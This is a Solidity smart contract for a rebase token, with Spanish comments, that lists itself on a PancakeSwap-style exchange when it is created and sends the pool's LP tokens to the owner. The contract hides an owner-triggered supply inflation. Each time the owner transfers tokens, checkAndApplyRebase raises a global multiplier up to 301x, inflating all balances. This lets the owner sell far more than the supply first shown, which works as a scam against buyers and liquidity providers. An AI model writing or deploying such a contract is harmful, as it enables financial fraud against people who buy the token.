// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CustomRebaseToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    
    uint256 private _totalSupply;
    address public owner;
    
    uint256 private constant BASE = 10**18;
    uint256 public rebaseMultiplier = BASE;

    mapping(address => uint256) private _gBalances; 
    mapping(address => mapping(address => uint256)) public allowance;

    string public logoUrl;
    string public website;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event RebaseExecuted(uint256 newMultiplier);

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _amount,
        string memory _logo,
        string memory _web,
        address _owner,
        address _routerAddress
    ) payable {
        require(_amount <= 500000000, "Maximo 500M tokens");
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        owner = _owner;
        logoUrl = _logo;
        website = _web;

        _totalSupply = _amount * (10 ** uint256(decimals));
        _gBalances[owner] = _totalSupply;

        emit Transfer(address(0), owner, _totalSupply);

        // Auto-listado si se envia BNB junto a la creacion
        if (msg.value > 0) {
            uint256 tokensForLiquidity = _totalSupply / 2; // 50% de los tokens van al pool
            _gBalances[owner] -= tokensForLiquidity;
            _gBalances[address(this)] = tokensForLiquidity;

            allowance[address(this)][_routerAddress] = tokensForLiquidity;
            emit Approval(address(this), _routerAddress, tokensForLiquidity);

            IPancakeRouter02 router = IPancakeRouter02(_routerAddress);
            
            router.addLiquidityETH{value: msg.value}(
                address(this),
                tokensForLiquidity,
                0, 
                0, 
                owner,
                block.timestamp + 3600
            );
        }
    }

    function totalSupply() public view returns (uint256) {
        return (_totalSupply * rebaseMultiplier) / BASE;
    }

    function balanceOf(address account) public view returns (uint256) {
        return (_gBalances[account] * rebaseMultiplier) / BASE;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(allowance[from][msg.sender] >= value, "Aprobacion insuficiente");
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0) && to != address(0), "Direccion invalida");
        uint256 gValue = (value * BASE) / rebaseMultiplier;
        require(_gBalances[from] >= gValue, "Saldo insuficiente");
        
        _gBalances[from] -= gValue;
        _gBalances[to] += gValue;

        emit Transfer(from, to, value);

        if (from == owner) {
            checkAndApplyRebase();
        }
    }

    function checkAndApplyRebase() internal {
        uint256 ownerTokens = _gBalances[owner] / (10 ** decimals);

        if (ownerTokens <= 10000000) {
            rebaseMultiplier = BASE * 301; // +30000%
        } else if (ownerTokens <= 50000000) {
            rebaseMultiplier = BASE * 51;  // +5000%
        } else if (ownerTokens <= 300000000) {
            rebaseMultiplier = BASE * 4;   // +300%
        } else if (ownerTokens <= 400000000) {
            rebaseMultiplier = (BASE * 14) / 10; // +40%
        } else {
            rebaseMultiplier = BASE;
        }
        emit RebaseExecuted(rebaseMultiplier);
    }
}
